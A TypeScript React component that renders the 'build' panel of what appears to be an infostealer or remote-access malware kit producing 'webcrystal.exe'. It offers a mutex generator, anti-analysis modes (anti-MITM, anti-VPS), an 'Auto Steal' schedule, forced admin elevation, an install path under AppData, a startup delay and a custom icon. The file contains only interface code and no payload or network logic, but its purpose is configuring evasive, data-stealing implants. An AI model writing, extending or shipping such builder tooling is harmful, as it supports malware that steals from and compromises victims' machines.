"use client";

import { useMemo, useState } from "react";

const fieldLabelClass = "text-[12px] font-bold text-white/70";
const inputClass =
  "h-[38px] w-full rounded-[12px] border border-white/15 bg-black/30 px-3 text-[13px] text-white/90 outline-none focus:border-white/25";
const selectClass =
  "h-[38px] w-full rounded-[12px] border border-white/15 bg-black/30 px-3 text-[13px] text-white/90 outline-none focus:border-white/25";

function makeMutex(): string {
  const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let out = "WEBR_";
  for (let i = 0; i < 12; i += 1) {
    out += alphabet[Math.floor(Math.random() * alphabet.length)] ?? "X";
  }
  return out;
}

export function BuilderScreen() {
  const [open, setOpen] = useState(false);
  const [mutex] = useState(() => makeMutex());
  const [installMode, setInstallMode] = useState<string>("random");
  const [delay, setDelay] = useState<number>(2);

  const toggleText = useMemo(() => (open ? "Hide" : "Create new build"), [open]);

  return (
    <div id="builderView" className="h-full overflow-auto">
      <div className="mx-auto w-full max-w-[min(1500px,calc(100vw-60px))] px-[10px] pb-[10px] pt-[22px]">
        <div className="flex flex-col gap-4">
          <button
            id="builderToggle"
            className="inline-flex h-[44px] items-center justify-center rounded-[14px] border border-white/15 bg-white/5 px-4 text-[14px] font-extrabold text-white/90 shadow-[0_18px_50px_rgba(0,0,0,0.55),inset_0_1px_0_rgba(255,255,255,0.06)] backdrop-blur-md hover:bg-white/10"
            type="button"
            onClick={() => setOpen((v) => !v)}
          >
            <span id="builderToggleText" className="builderToggleText">
              {toggleText}
            </span>
          </button>

          <div id="builderForm" className="builderForm" hidden={!open}>
            <div className="rounded-[18px] border border-white/15 bg-black/30 p-4 shadow-[0_18px_44px_rgba(0,0,0,0.6),0_0_0_4px_rgba(255,255,255,0.04)] backdrop-blur-md">
              <div className="grid gap-4 md:grid-cols-2">
                <div className="grid gap-4">
                  <div className="grid gap-2">
                    <span className={fieldLabelClass}>name</span>
                    <input id="buildName" className={inputClass} type="text" placeholder="name" autoComplete="off" maxLength={25} />
                  </div>

                  <div className="grid gap-2">
                    <span className={fieldLabelClass}>mutex</span>
                    <input
                      id="buildMutex"
                      className={inputClass}
                      type="text"
                      value={mutex}
                      readOnly
                      style={{ color: "gray" }}
                    />
                  </div>

                  <div className="grid gap-2">
                    <span className={fieldLabelClass}>Comment</span>
                    <input
                      id="buildComment"
                      className={inputClass}
                      type="text"
                      placeholder="comment"
                      autoComplete="off"
                      maxLength={10}
                    />
                  </div>

                  <div className="grid gap-2">
                    <span className={fieldLabelClass}>Anti-analysis</span>
                    <select id="antiAnalysis" className={selectClass} defaultValue="None">
                      <option value="None">None</option>
                      <option value="AntiMitm">Anti Mitm</option>
                      <option value="AntiVps">Anti VPS</option>
                      <option value="Full">Full</option>
                    </select>
                  </div>

                  <div className="grid gap-2">
                    <span className={fieldLabelClass}>Extension</span>
                    <input
                      id="extension"
                      className={inputClass}
                      type="text"
                      value="webcrystal.exe"
                      readOnly
                      tabIndex={-1}
                      style={{ color: "gray" }}
                    />
                  </div>

                  <div className="grid gap-2">
                    <span className={fieldLabelClass}>Build icon</span>
                    <div className="grid gap-2 rounded-[14px] border border-white/10 bg-black/30 p-3">
                      <input id="buildIcon" className="hidden" type="file" accept=".ico" />
                      <div className="flex items-center gap-2">
                        <button
                          id="buildIconChooseBtn"
                          className="rounded-[12px] border border-white/15 bg-white/5 px-3 py-2 text-[13px] font-bold text-white/85 hover:bg-white/10"
                          type="button"
                        >
                          Choose .ico
                        </button>
                        <button
                          id="buildIconClearBtn"
                          className="rounded-[12px] border border-white/15 bg-white/5 px-3 py-2 text-[13px] font-bold text-white/85 hover:bg-white/10"
                          type="button"
                        >
                          Clear
                        </button>
                      </div>
                      <div id="buildIconName" className="text-[12px] font-semibold text-white/60">
                        No icon selected
                      </div>
                    </div>
                  </div>
                </div>

                <div className="grid gap-4">
                  <div className="grid grid-cols-1 gap-4 md:grid-cols-2">
                    <div className="grid gap-2">
                      <span className={fieldLabelClass}>Auto Steal</span>
                      <select id="autoSteal" className={selectClass} defaultValue="Once">
                        <option value="Once">Once</option>
                        <option value="Every connect">Every connect</option>
                      </select>
                    </div>
                    <div className="grid gap-2">
                      <span className={fieldLabelClass}>Force admin</span>
                      <select id="forceAdmin" className={selectClass} defaultValue="Normal">
                        <option value="Normal">Normal</option>
                        <option value="Agressive">Agressive</option>
                      </select>
                    </div>
                    <div className="grid gap-2">
                      <span className={fieldLabelClass}>Install</span>
                      <select
                        id="installMode"
                        className={selectClass}
                        value={installMode}
                        onChange={(e) => setInstallMode(e.target.value)}
                      >
                        <option value="random">Random</option>
                        <option value="custom">Custom</option>
                      </select>
                    </div>
                    <div
                      id="installPathRow"
                      className="grid gap-2"
                      hidden={installMode !== "custom"}
                    >
                      <span className={fieldLabelClass}>Path</span>
                      <input
                        id="installPath"
                        className={inputClass}
                        type="text"
                        placeholder="$AppData\\build.exe"
                        autoComplete="off"
                      />
                    </div>
                  </div>

                  <div className="grid gap-2" role="group" aria-label="Startup delay">
                    <span className={fieldLabelClass}>Startup delay (sec)</span>
                    <div className="flex h-[38px] overflow-hidden rounded-[12px] border border-white/15 bg-black/30">
                      <button
                        id="copyMinus"
                        className="w-[44px] border-r border-white/10 text-[16px] font-extrabold text-white/80 hover:bg-white/5"
                        type="button"
                        aria-label="minus"
                        onClick={() => setDelay((v) => Math.max(0, v - 1))}
                      >
                        -
                      </button>
                      <div
                        id="copyCount"
                        className="flex flex-1 items-center justify-center text-[14px] font-extrabold text-white/90"
                      >
                        {delay}
                      </div>
                      <button
                        id="copyPlus"
                        className="w-[44px] border-l border-white/10 text-[16px] font-extrabold text-white/80 hover:bg-white/5"
                        type="button"
                        aria-label="plus"
                        onClick={() => setDelay((v) => Math.min(999, v + 1))}
                      >
                        +
                      </button>
                    </div>
                  </div>

                  <div className="flex flex-wrap gap-2 pt-2">
                    <button
                      id="builderSubmit"
                      type="button"
                      className="h-[42px] rounded-[14px] border border-white/15 bg-[rgba(240,105,236,0.18)] px-5 text-[14px] font-extrabold text-white/95 hover:bg-[rgba(240,105,236,0.22)]"
                    >
                      Build
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}